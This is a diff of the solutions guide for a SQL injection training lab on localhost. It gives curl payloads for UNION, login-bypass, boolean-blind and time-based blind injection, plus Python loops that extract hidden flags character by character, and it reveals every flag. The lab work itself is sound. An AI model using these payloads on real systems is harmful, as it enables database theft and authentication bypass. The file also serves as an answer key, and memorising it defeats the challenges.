@@ -6,13 +6,17 @@ CHALLENGE 1: UNION-Based SQL Injection (Search)
 Flag: FLAG{un10n_s3l3ct_m4st3r}
 
   The /search endpoint concatenates user input into a LIKE query:
-    SELECT * FROM posts WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
+    SELECT id, title, content, author, category, created_at
+    FROM posts WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
 
   Inject a UNION SELECT to extract from the flags table:
 
   curl "http://localhost:5001/search?q=' UNION SELECT 1,flag_name,flag_value,4,5,6 FROM flags--"
 
-  All flags from the flags table are returned as "posts".
+  The flag is returned as a "post" in the search results.
+
+  NOTE: The flags table contains ONLY the ch1 flag. Ch2/ch3/ch4 flags
+  are stored elsewhere and cannot be leaked through this query.
 
 -------------------------------------------------------------------------------
 
@@ -28,7 +32,12 @@ Flag: FLAG{4uth_byp4ss_sqli}
     -d "username=admin'--&password=anything"
 
   Alternative: username = ' OR 1=1--, password = anything
-  The admin dashboard appears with the flag.
+
+  On successful admin login, the flag is read from the admin user's
+  secret_note column and displayed on the page.
+
+  NOTE: The flag lives in users.secret_note — it is NOT in the flags
+  table, so ch1 UNION injection will not reveal it.
 
 -------------------------------------------------------------------------------
 
@@ -36,80 +45,93 @@ CHALLENGE 3: Blind Boolean-Based SQL Injection (Post)
 Flag: FLAG{bl1nd_sql1_pr0}
 
   The /post/<id> endpoint is vulnerable to integer-based injection:
-    SELECT * FROM posts WHERE id = {post_id}
+    SELECT id, title, content, author, category, created_at
+    FROM posts WHERE id = {post_id}
+
+  The flag is stored in the hidden_content column of post id 3, but
+  that column is NOT included in the SELECT, so you cannot see it
+  directly or via UNION (the column is never returned).
+
+  You must extract it character by character using boolean conditions:
+
+  Test baseline:
+    curl http://localhost:5001/post/1%20AND%201=1    (returns post)
+    curl http://localhost:5001/post/1%20AND%201=2    (returns 404)
+
+  Extract character 1 of the flag:
+    /post/1 AND (SELECT unicode(substr(hidden_content,1,1)) FROM posts WHERE id=3)>65
+
+  Binary-search the ASCII value of each character.  The flag is 20
+  characters long: FLAG{bl1nd_sql1_pr0}
+
+  Automation example (Python pseudocode):
+    for pos in range(1, 21):
+        low, high = 32, 126
+        while low < high:
+            mid = (low + high) // 2
+            url = f"http://localhost:5001/post/1 AND (SELECT unicode(substr(hidden_content,{pos},1)) FROM posts WHERE id=3)>{mid}"
+            if requests.get(url).status_code == 200:
+                low = mid + 1
+            else:
+                high = mid
+        flag += chr(low)
+
+  NOTE: The flag lives in posts.hidden_content — it is NOT in the
+  flags table and NOT in users.secret_note.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Time-Based Blind SQL Injection (API)
+Flag: FLAG{t1m3_b4s3d_bl1nd}
+
+  The /api/user endpoint takes an id parameter and returns JSON
+  with only the username:
+    SELECT id, username FROM users WHERE id = {id}
+
+  The flag is in the time_flag column of user id 1 (admin), but that
+  column is never returned in the JSON response.
+
+  Use a timing side-channel with SQLite's randomblob() to cause a
+  measurable delay when a condition is true:
 
   Test:
-    curl http://localhost:5001/post/1%20AND%201=1    (returns post)
-    curl http://localhost:5001/post/1%20AND%201=2    (returns nothing)
+    curl "http://localhost:5001/api/user?id=1"
+    -> {"status":"success","user":{"id":1,"username":"admin"}}  (fast)
 
-  Extract the flag from the flags table character by character:
-    /post/1 AND (SELECT unicode(substr(flag_value,1,1)) FROM flags LIMIT 1)>64
+    curl "http://localhost:5001/api/user?id=1 AND CASE WHEN 1=1 THEN randomblob(100000000) ELSE 0 END"
+    -> slow response (confirms timing injection works)
 
-  Or use UNION directly:
-    curl "http://localhost:5001/post/1 UNION SELECT 1,flag_value,3,4,5,6 FROM flags WHERE flag_name='blind_flag'"
+    curl "http://localhost:5001/api/user?id=1 AND CASE WHEN 1=2 THEN randomblob(100000000) ELSE 0 END"
+    -> fast response
 
--------------------------------------------------------------------------------
+  Extract character by character:
+    /api/user?id=1 AND CASE WHEN (unicode(substr((SELECT time_flag FROM users WHERE id=1),1,1))>70) THEN randomblob(100000000) ELSE 0 END
 
-CHALLENGE 4: Profile IDOR + SQL Injection
-Flag: FLAG{sqli_profile_idor_4dm1n}
+  Binary-search each character by measuring response time.
+  The flag is 21 characters: FLAG{t1m3_b4s3d_bl1nd}
 
-  The /profile endpoint takes an id parameter with no authorization check:
-    SELECT * FROM users WHERE id = {id}
+  Automation example (Python pseudocode):
+    import time, requests
+    flag = ""
+    for pos in range(1, 22):
+        low, high = 32, 126
+        while low < high:
+            mid = (low + high) // 2
+            payload = (
+                f"1 AND CASE WHEN (unicode(substr("
+                f"(SELECT time_flag FROM users WHERE id=1),{pos},1))>{mid})"
+                f" THEN randomblob(100000000) ELSE 0 END"
+            )
+            start = time.time()
+            requests.get(f"http://localhost:5001/api/user", params={"id": payload})
+            elapsed = time.time() - start
+            if elapsed > 1.0:   # threshold — slow means condition was true
+                low = mid + 1
+            else:
+                high = mid
+        flag += chr(low)
 
-  Simply access admin's profile:
-  curl "http://localhost:5001/profile?id=1"
-
-  The admin's secret_note field contains the flag.
-
-  UNION injection also works:
-  curl "http://localhost:5001/profile?id=1 UNION SELECT 1,2,3,4,flag_value FROM flags--"
-
--------------------------------------------------------------------------------
-
-CHALLENGE 5: Stacked Queries (Admin Logs)
-Flag: FLAG{st4ck3d_qu3ry_h4ck}
-
-  The /admin/logs endpoint has a sort parameter:
-    SELECT * FROM admin_logs ORDER BY {sort}
-
-  The hidden logs have is_admin_visible=0. Use stacked queries to
-  make them visible:
-
-  curl "http://localhost:5001/admin/logs?sort=id;UPDATE admin_logs SET is_admin_visible=1 WHERE 1=1--"
-
-  Then visit the admin logs page again:
-  curl http://localhost:5001/admin/logs
-
-  The previously hidden log entry contains the flag.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 6: Error-Based SQL Injection (API)
-Flag: FLAG{3rr0r_b4s3d_l34k}
-
-  The /api/posts endpoint returns detailed error messages as JSON,
-  including the full query text:
-    SELECT * FROM posts WHERE category = '{category}'
-
-  Step 1: Use error messages to discover the column count:
-  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,2,3--"
-  Error: "SELECTs to the left and right of UNION do not have the same
-  number of result columns" (tells you 3 is wrong)
-
-  Step 2: Find correct column count (6 columns):
-  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,2,3,4,5,6--"
-  (succeeds — no error)
-
-  Step 3: Extract the flag via UNION:
-  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,'api_flag',flag_value,4,5,6+FROM+flags+WHERE+flag_name%3D'api_flag'--"
-
-  The key difference from Challenge 1 is that this endpoint returns
-  JSON with structured error messages — useful for column discovery
-  and debugging injection payloads. In MySQL/MSSQL, CAST/CONVERT-based
-  errors can leak data directly; SQLite is more limited.
-
-  NOTE: SQLite doesn't produce CAST errors that embed data (it silently
-  converts), so the primary technique here is using the error feedback
-  to refine a UNION-based extraction.
+  NOTE: The flag lives in users.time_flag — it is NOT in the flags
+  table, NOT in secret_note, and NOT in hidden_content.
 
 ===============================================================================
